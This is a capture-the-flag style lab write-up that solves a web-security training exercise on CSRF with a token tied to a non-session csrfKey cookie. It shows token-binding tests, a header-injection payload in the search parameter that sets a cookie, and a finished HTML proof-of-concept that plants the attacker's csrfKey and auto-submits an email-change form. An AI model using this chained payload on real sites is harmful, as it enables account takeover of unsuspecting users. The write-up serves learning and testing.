# CSRF where token is tied to non-session cookie

### Goal - 

use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.

Credentials - wiener:peter, carlos:montoya

### Analysis/Exploitation -

Login as user `wiener`:

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/48a33bf9-4b46-4623-b486-8713da08cf8b/2024-02-19_09-40.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466TXB4GXRS%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221848Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHCaLqGK%2BEa2vwtkeu885jNsrWZ4B6g4joPBRiT5Ao17AiEA4ZWsgvkj%2FAwZ5CIbwU7bxD4Y%2BpkfNVwvqhc5gdmBmAMqiAQIrv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDLWmqkcQ6o%2F%2B6YGxzCrcA6V7fjc6FP7wi8uunkGEtT6GB54dj05C3gYqtB46Kkvzn%2FSUmecRh0%2BoW58JKYQN%2FnofM9Hpy1g%2Fs%2BaPAiY3yFVaqG%2Bnq%2BfXL4GR7UxT1RhT2fKxKKywOW%2F8RgQlUrq53spnEEAP%2Fy%2B5CYbrue%2BrnsQGVll9rZdxLF3lnyMtIcA6Og9AUSOt6klZ%2FbRIGNF6h3%2F2QDWBSsrsfbbtz5aEOZ2muHYkueVV4sd6C59FFHTRHLO3NPL3J4Ntw9KLYTqqNoMqok%2F7F69HIR40A1%2BQQmJJzR7RpmSISNIJFm897uwWLOHThhwfxOmcd3vbJRsY3I5h9wxg%2FJFWEq6qe4mxOYfPbPC89Rtb5a%2FYkTOMKQskRPRlMGQwhAM2iiNeYImgFY8B9Bv5ZPi0TT8RNJ45lHKsCGCLafiXodUrf6lebMNJzTw%2F8YUFt6CuKWYNy%2B%2F5T4lxyZJKZfAe4WT%2FbAE62iQcrARRJSNG%2BHRsH6Ah8MWMfAgOPKltx0WUcBBxS453qmtIslFjIxiGtCe%2Ft3a8n2fbCZJrJD7mwNWQVGGm0SLsC4EaE7LDXnOzD9fVMARwHBN8Xidt0ZByrbBGtZnDhQKNgAl%2FEnIxSslOLYAI1f3vHc0%2Bc0JZhwNvKbm0MPSEo9QGOqUBOf5pV6giB%2FRXnJtWWiutDvLtHZcazGyRJ1FqGgYYgIYTUciYM%2BPFgU5i%2FyCFeXdh74R%2BWe%2Bor1lLu6IfLNZq%2BamBLstjv4JtYtvGiLaz5MaNOZKl26fVO3tLrJp4BrqRjn5KeOhUmRWlNNk3%2FY%2BmAZAPk%2Fn34QBiB2lx1E0s0ypE8V0GKxNBDCh5gWSqT5PbpAM3r%2FPt1TjF42OhOeJC5fBqurdP&X-Amz-Signature=6c3c0b593fadc689b59784e686995b290ba2060cf4a95d96d44ecb3c317d43e8&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

The session cookie and the csrf-tokens are the expected parts. But there is a second cookie `csrfKey`, that looks very similar to a second session value.

All values remain static for the session. When I logout and login again as the same user, the session cookie changes (this is expected) but csrfKey and csrf-token remain the same.

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/660e4e77-f387-4cc6-a69a-54867b104a3a/2024-02-19_09-47.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466TXB4GXRS%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221848Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHCaLqGK%2BEa2vwtkeu885jNsrWZ4B6g4joPBRiT5Ao17AiEA4ZWsgvkj%2FAwZ5CIbwU7bxD4Y%2BpkfNVwvqhc5gdmBmAMqiAQIrv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDLWmqkcQ6o%2F%2B6YGxzCrcA6V7fjc6FP7wi8uunkGEtT6GB54dj05C3gYqtB46Kkvzn%2FSUmecRh0%2BoW58JKYQN%2FnofM9Hpy1g%2Fs%2BaPAiY3yFVaqG%2Bnq%2BfXL4GR7UxT1RhT2fKxKKywOW%2F8RgQlUrq53spnEEAP%2Fy%2B5CYbrue%2BrnsQGVll9rZdxLF3lnyMtIcA6Og9AUSOt6klZ%2FbRIGNF6h3%2F2QDWBSsrsfbbtz5aEOZ2muHYkueVV4sd6C59FFHTRHLO3NPL3J4Ntw9KLYTqqNoMqok%2F7F69HIR40A1%2BQQmJJzR7RpmSISNIJFm897uwWLOHThhwfxOmcd3vbJRsY3I5h9wxg%2FJFWEq6qe4mxOYfPbPC89Rtb5a%2FYkTOMKQskRPRlMGQwhAM2iiNeYImgFY8B9Bv5ZPi0TT8RNJ45lHKsCGCLafiXodUrf6lebMNJzTw%2F8YUFt6CuKWYNy%2B%2F5T4lxyZJKZfAe4WT%2FbAE62iQcrARRJSNG%2BHRsH6Ah8MWMfAgOPKltx0WUcBBxS453qmtIslFjIxiGtCe%2Ft3a8n2fbCZJrJD7mwNWQVGGm0SLsC4EaE7LDXnOzD9fVMARwHBN8Xidt0ZByrbBGtZnDhQKNgAl%2FEnIxSslOLYAI1f3vHc0%2Bc0JZhwNvKbm0MPSEo9QGOqUBOf5pV6giB%2FRXnJtWWiutDvLtHZcazGyRJ1FqGgYYgIYTUciYM%2BPFgU5i%2FyCFeXdh74R%2BWe%2Bor1lLu6IfLNZq%2BamBLstjv4JtYtvGiLaz5MaNOZKl26fVO3tLrJp4BrqRjn5KeOhUmRWlNNk3%2FY%2BmAZAPk%2Fn34QBiB2lx1E0s0ypE8V0GKxNBDCh5gWSqT5PbpAM3r%2FPt1TjF42OhOeJC5fBqurdP&X-Amz-Signature=043a6e288bd625070ddb826f63a173349a4a42effafa985b19b8c28107f23725&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

This indicates that the system providing the CSRF protection does not integrate into the session system, but creates its own type of session that is not in sync. This might violate the **tightly connected** property mentioned earlier.

> 💡 **Testing CSRF Tokens and CSRF cookies:**

  1. Check if the CSRF token is tied to the CSRF cookie
    - Submit an invalid CSRF token
    - Submit a valid CSRF token from another user

—>we get error and it concludes CSRF token may be tied to session or csrfKey cookie

  1. Submit both valid CSRF token and cookie from another user
—>we get 302 response and it concludes CSRF token is tied to csrfKey cookie

**In order to exploit this vulnerability, we need to perform 2 things:**

  1. Inject a csrfKey cookie in the user's session (HTTP Header injection) - satisfied
  1. Send a CSRF attack to the victim with a known csrf token
Login as user `carlos` in incognito:

Submit the "Update email" form, and intercept the resulting request.

**use  the session ID from the current **`carlos`**session, but both **`csrfKey`** as well ass **`csrf`**-token from user **`wiener`

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/c193d7c0-226f-4233-af37-70b28ae92d9c/2024-02-19_09-54.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466TXB4GXRS%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221848Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHCaLqGK%2BEa2vwtkeu885jNsrWZ4B6g4joPBRiT5Ao17AiEA4ZWsgvkj%2FAwZ5CIbwU7bxD4Y%2BpkfNVwvqhc5gdmBmAMqiAQIrv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDLWmqkcQ6o%2F%2B6YGxzCrcA6V7fjc6FP7wi8uunkGEtT6GB54dj05C3gYqtB46Kkvzn%2FSUmecRh0%2BoW58JKYQN%2FnofM9Hpy1g%2Fs%2BaPAiY3yFVaqG%2Bnq%2BfXL4GR7UxT1RhT2fKxKKywOW%2F8RgQlUrq53spnEEAP%2Fy%2B5CYbrue%2BrnsQGVll9rZdxLF3lnyMtIcA6Og9AUSOt6klZ%2FbRIGNF6h3%2F2QDWBSsrsfbbtz5aEOZ2muHYkueVV4sd6C59FFHTRHLO3NPL3J4Ntw9KLYTqqNoMqok%2F7F69HIR40A1%2BQQmJJzR7RpmSISNIJFm897uwWLOHThhwfxOmcd3vbJRsY3I5h9wxg%2FJFWEq6qe4mxOYfPbPC89Rtb5a%2FYkTOMKQskRPRlMGQwhAM2iiNeYImgFY8B9Bv5ZPi0TT8RNJ45lHKsCGCLafiXodUrf6lebMNJzTw%2F8YUFt6CuKWYNy%2B%2F5T4lxyZJKZfAe4WT%2FbAE62iQcrARRJSNG%2BHRsH6Ah8MWMfAgOPKltx0WUcBBxS453qmtIslFjIxiGtCe%2Ft3a8n2fbCZJrJD7mwNWQVGGm0SLsC4EaE7LDXnOzD9fVMARwHBN8Xidt0ZByrbBGtZnDhQKNgAl%2FEnIxSslOLYAI1f3vHc0%2Bc0JZhwNvKbm0MPSEo9QGOqUBOf5pV6giB%2FRXnJtWWiutDvLtHZcazGyRJ1FqGgYYgIYTUciYM%2BPFgU5i%2FyCFeXdh74R%2BWe%2Bor1lLu6IfLNZq%2BamBLstjv4JtYtvGiLaz5MaNOZKl26fVO3tLrJp4BrqRjn5KeOhUmRWlNNk3%2FY%2BmAZAPk%2Fn34QBiB2lx1E0s0ypE8V0GKxNBDCh5gWSqT5PbpAM3r%2FPt1TjF42OhOeJC5fBqurdP&X-Amz-Signature=121d5a302accc2c005f9dcf70a17d40404144f9926f83195a145c31fe58bd29c&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

the request goes through and carlos email get changed:

I can change a victims email with my own CSRF-data. Including the csrf-token in the malicious HTML form is easy, but the `csrfKey` is taken from the cookie as **the **`csrfKey`** is a cookie**! And we couldn’t simply add our own cookie value. So the next step is to find a way to manipulate the cookie values.

**When we click the **`Search`** button, it’ll send a GET request to **`/`** with the parameter **`search`**.**

**Also, when we sent the request, it’ll set a new cookie value: **`LastSearchTerm=<seach_parameter_value>`**!**

So with it we can set any cookie value as we wanted.

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/9e4f597b-c136-4cde-8a1f-e406f9b8c932/2024-02-19_10-00.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466TXB4GXRS%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221848Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHCaLqGK%2BEa2vwtkeu885jNsrWZ4B6g4joPBRiT5Ao17AiEA4ZWsgvkj%2FAwZ5CIbwU7bxD4Y%2BpkfNVwvqhc5gdmBmAMqiAQIrv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDLWmqkcQ6o%2F%2B6YGxzCrcA6V7fjc6FP7wi8uunkGEtT6GB54dj05C3gYqtB46Kkvzn%2FSUmecRh0%2BoW58JKYQN%2FnofM9Hpy1g%2Fs%2BaPAiY3yFVaqG%2Bnq%2BfXL4GR7UxT1RhT2fKxKKywOW%2F8RgQlUrq53spnEEAP%2Fy%2B5CYbrue%2BrnsQGVll9rZdxLF3lnyMtIcA6Og9AUSOt6klZ%2FbRIGNF6h3%2F2QDWBSsrsfbbtz5aEOZ2muHYkueVV4sd6C59FFHTRHLO3NPL3J4Ntw9KLYTqqNoMqok%2F7F69HIR40A1%2BQQmJJzR7RpmSISNIJFm897uwWLOHThhwfxOmcd3vbJRsY3I5h9wxg%2FJFWEq6qe4mxOYfPbPC89Rtb5a%2FYkTOMKQskRPRlMGQwhAM2iiNeYImgFY8B9Bv5ZPi0TT8RNJ45lHKsCGCLafiXodUrf6lebMNJzTw%2F8YUFt6CuKWYNy%2B%2F5T4lxyZJKZfAe4WT%2FbAE62iQcrARRJSNG%2BHRsH6Ah8MWMfAgOPKltx0WUcBBxS453qmtIslFjIxiGtCe%2Ft3a8n2fbCZJrJD7mwNWQVGGm0SLsC4EaE7LDXnOzD9fVMARwHBN8Xidt0ZByrbBGtZnDhQKNgAl%2FEnIxSslOLYAI1f3vHc0%2Bc0JZhwNvKbm0MPSEo9QGOqUBOf5pV6giB%2FRXnJtWWiutDvLtHZcazGyRJ1FqGgYYgIYTUciYM%2BPFgU5i%2FyCFeXdh74R%2BWe%2Bor1lLu6IfLNZq%2BamBLstjv4JtYtvGiLaz5MaNOZKl26fVO3tLrJp4BrqRjn5KeOhUmRWlNNk3%2FY%2BmAZAPk%2Fn34QBiB2lx1E0s0ypE8V0GKxNBDCh5gWSqT5PbpAM3r%2FPt1TjF42OhOeJC5fBqurdP&X-Amz-Signature=701b25b57b3e527bfce4c51a39fdf4e7385cc20c9d8102037a60b340308c3e64&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

**In **[**Mozilla web docs**](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)**, it said:**

> To send multiple cookies, multiple Set-Cookie headers should be sent in the same response.

**After I google this a little bit, I found this **[**Medium blog**](https://medium.com/@protostar0/crlf-injection-allow-cookie-injection-in-root-domain-xss-812cd807ba5b)**: which says CRLF injection allow cookie injection?**

**And after googled about CRLF injection, I found this post on **[**GeeksforGeeks**](https://www.geeksforgeeks.org/crlf-injection-attack/)

- `\r`** (Carriage Return)** → moves the cursor to the beginning of the line without advancing to the next line
- `\n`** (Line Feed)** → moves the cursor down to the next line without returning to the beginning of the line

**So if the web application is vulnerable, we can inject **`%0d%0a`** (**`\r\n`**) in the request**

Note: The `%3b%20` means `; `, and we need `SameSite` is set to `None`.

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/85df3058-0706-4239-9d26-27f80ae15a72/2024-02-19_10-05.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466TXB4GXRS%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221848Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHCaLqGK%2BEa2vwtkeu885jNsrWZ4B6g4joPBRiT5Ao17AiEA4ZWsgvkj%2FAwZ5CIbwU7bxD4Y%2BpkfNVwvqhc5gdmBmAMqiAQIrv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDLWmqkcQ6o%2F%2B6YGxzCrcA6V7fjc6FP7wi8uunkGEtT6GB54dj05C3gYqtB46Kkvzn%2FSUmecRh0%2BoW58JKYQN%2FnofM9Hpy1g%2Fs%2BaPAiY3yFVaqG%2Bnq%2BfXL4GR7UxT1RhT2fKxKKywOW%2F8RgQlUrq53spnEEAP%2Fy%2B5CYbrue%2BrnsQGVll9rZdxLF3lnyMtIcA6Og9AUSOt6klZ%2FbRIGNF6h3%2F2QDWBSsrsfbbtz5aEOZ2muHYkueVV4sd6C59FFHTRHLO3NPL3J4Ntw9KLYTqqNoMqok%2F7F69HIR40A1%2BQQmJJzR7RpmSISNIJFm897uwWLOHThhwfxOmcd3vbJRsY3I5h9wxg%2FJFWEq6qe4mxOYfPbPC89Rtb5a%2FYkTOMKQskRPRlMGQwhAM2iiNeYImgFY8B9Bv5ZPi0TT8RNJ45lHKsCGCLafiXodUrf6lebMNJzTw%2F8YUFt6CuKWYNy%2B%2F5T4lxyZJKZfAe4WT%2FbAE62iQcrARRJSNG%2BHRsH6Ah8MWMfAgOPKltx0WUcBBxS453qmtIslFjIxiGtCe%2Ft3a8n2fbCZJrJD7mwNWQVGGm0SLsC4EaE7LDXnOzD9fVMARwHBN8Xidt0ZByrbBGtZnDhQKNgAl%2FEnIxSslOLYAI1f3vHc0%2Bc0JZhwNvKbm0MPSEo9QGOqUBOf5pV6giB%2FRXnJtWWiutDvLtHZcazGyRJ1FqGgYYgIYTUciYM%2BPFgU5i%2FyCFeXdh74R%2BWe%2Bor1lLu6IfLNZq%2BamBLstjv4JtYtvGiLaz5MaNOZKl26fVO3tLrJp4BrqRjn5KeOhUmRWlNNk3%2FY%2BmAZAPk%2Fn34QBiB2lx1E0s0ypE8V0GKxNBDCh5gWSqT5PbpAM3r%2FPt1TjF42OhOeJC5fBqurdP&X-Amz-Signature=65a42a992ccfc2c3b223d1e56ce241c3ea12e4ab122a253eb4d237aca695a393&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

generate csrf poc

Remove the auto-submit `<script>` block, and instead add the following code to inject the cookie:

```text
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.form
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/39a7df58-e6fb-4bcf-9624-13ebea3239b0/2024-02-20_15-21.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466TXB4GXRS%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221848Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHCaLqGK%2BEa2vwtkeu885jNsrWZ4B6g4joPBRiT5Ao17AiEA4ZWsgvkj%2FAwZ5CIbwU7bxD4Y%2BpkfNVwvqhc5gdmBmAMqiAQIrv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDLWmqkcQ6o%2F%2B6YGxzCrcA6V7fjc6FP7wi8uunkGEtT6GB54dj05C3gYqtB46Kkvzn%2FSUmecRh0%2BoW58JKYQN%2FnofM9Hpy1g%2Fs%2BaPAiY3yFVaqG%2Bnq%2BfXL4GR7UxT1RhT2fKxKKywOW%2F8RgQlUrq53spnEEAP%2Fy%2B5CYbrue%2BrnsQGVll9rZdxLF3lnyMtIcA6Og9AUSOt6klZ%2FbRIGNF6h3%2F2QDWBSsrsfbbtz5aEOZ2muHYkueVV4sd6C59FFHTRHLO3NPL3J4Ntw9KLYTqqNoMqok%2F7F69HIR40A1%2BQQmJJzR7RpmSISNIJFm897uwWLOHThhwfxOmcd3vbJRsY3I5h9wxg%2FJFWEq6qe4mxOYfPbPC89Rtb5a%2FYkTOMKQskRPRlMGQwhAM2iiNeYImgFY8B9Bv5ZPi0TT8RNJ45lHKsCGCLafiXodUrf6lebMNJzTw%2F8YUFt6CuKWYNy%2B%2F5T4lxyZJKZfAe4WT%2FbAE62iQcrARRJSNG%2BHRsH6Ah8MWMfAgOPKltx0WUcBBxS453qmtIslFjIxiGtCe%2Ft3a8n2fbCZJrJD7mwNWQVGGm0SLsC4EaE7LDXnOzD9fVMARwHBN8Xidt0ZByrbBGtZnDhQKNgAl%2FEnIxSslOLYAI1f3vHc0%2Bc0JZhwNvKbm0MPSEo9QGOqUBOf5pV6giB%2FRXnJtWWiutDvLtHZcazGyRJ1FqGgYYgIYTUciYM%2BPFgU5i%2FyCFeXdh74R%2BWe%2Bor1lLu6IfLNZq%2BamBLstjv4JtYtvGiLaz5MaNOZKl26fVO3tLrJp4BrqRjn5KeOhUmRWlNNk3%2FY%2BmAZAPk%2Fn34QBiB2lx1E0s0ypE8V0GKxNBDCh5gWSqT5PbpAM3r%2FPt1TjF42OhOeJC5fBqurdP&X-Amz-Signature=948c44183d0c626aec3557a9a4ae49d184554913219af01cc9426e084cacb3f9&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a1800d3045ae7ed82e29854004c006f.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;domain&#46;com" />
      <input type="hidden" name="csrf" value="GDejMnJlFfCIXtNUq4fiUPAZwU3ew3dQ" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a1800d3045ae7ed82e29854004c006f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=EI5tQ8UWhMoPUcfJk0ulcN7mRnPhkcaC%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```
